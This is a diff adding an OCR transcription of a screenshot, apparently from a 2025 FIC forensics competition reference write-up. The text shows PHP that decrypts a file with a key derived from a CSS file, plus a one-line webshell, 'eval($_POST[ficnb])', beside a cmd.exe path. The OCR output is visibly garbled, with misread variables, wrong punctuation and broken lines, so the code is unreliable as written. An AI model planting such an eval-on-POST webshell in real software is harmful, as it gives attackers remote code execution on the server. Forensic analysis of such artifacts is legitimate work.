@@ -1,0 +1,18 @@
+# OCR: 8fbc4bbdb65b836b3d59b6ad23888cbc.webp
+# 来源: ./02-WriteUp/2025/2025-FIC-初赛参考WP/8fbc4bbdb65b836b3d59b6ad23888cbc.webp
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 生成: 2026-11-03 15:25
+
+3 4 5 6 7 8 9 10 11
+<?php
+sa=file_get_contents（./蜂蜜锅底.css'）： $b=mds($a,true);
+sc=file_get_contents('./encrypted.bin');
+$d=base64_decode(sc); $e='aes-256-cbc';
+$f=openssl cipheriv length($e):
+$g=substr($d,e,sf); $h=substr($d,$f);
+$i=openssl_decrypt($h,$e,$b,OPENSSL_RAwDATA,$g) echosi;
+C:\Windows|System32)cmd.e) functionyijuhuaO
+x
+>phptest.php
+echo"Kangle)isOK!FICerisgood!";
+evai(s_posT[ficnb])
